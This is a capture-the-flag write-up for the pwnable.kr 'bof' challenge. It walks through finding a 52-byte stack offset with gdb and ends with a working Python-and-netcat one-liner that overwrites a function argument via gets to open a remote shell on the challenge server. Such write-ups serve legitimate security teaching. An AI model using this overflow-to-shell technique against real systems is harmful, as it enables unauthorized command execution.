# 03 - bof

## The Challenge

Nana told me that buffer overflow is one of the most common software vulnerability. Is that true?

Running at: nc pwnable.kr 9000

## The Solution

This is a basic buffer overflow challenge.

![](../.gitbook/assets/image%20%285%29.png)

We need to override the argument of the function **func** using the unsafe **gets** function and the variable **overflowme**. Afterward, we need to maintain the connection to the server with the newly opened shell and obtain the flag.

### Finding the offset

We're using **gdb**. Set a breakpoint at the beginning of the "func" function, and print the next 15 instructions to find **gets**.

![](../.gitbook/assets/image%20%287%29.png)

Here it is, at 0x5655564f. Set a breakpoint at the next instruction and continue execution.

Enter easy to read input, like so

![](../.gitbook/assets/image%20%288%29.png)

Now examine 32 word-sized chunks of memory starting at ESP.

![](../.gitbook/assets/image%20%286%29.png)

Here is our 32-byte input, and after an offset of 52 lies 0xdeadbeef. So, **52** is our offset.

### Python3 one-liner

It turns out that python3 print\(\) function encodes characters as a sequence of Unicode characters instead of a sequence of bytes \[[link](https://stackoverflow.com/questions/32017389/write-different-hex-values-in-python2-and-python3)\]. Instead of print\(\), sys.stdout.buffer.write was used for the buffer. To gain a semi-interactive shell we sent over the **cat** command without arguments. From 'cat' man page:

> With no FILE, or when FILE is -, read standard input.

Try and run cat without arguments on your machine. it echoes back every input. By sending it to the newly opened shell on Pwnable's remote machine we get command execution with some interactivity. 

```text
(python3 -c "import sys; sys.stdout.buffer.write(b'A' * 52 + b'\xbe\xba\xfe\xca\n')" && cat) | nc pwnable.kr 9000
```

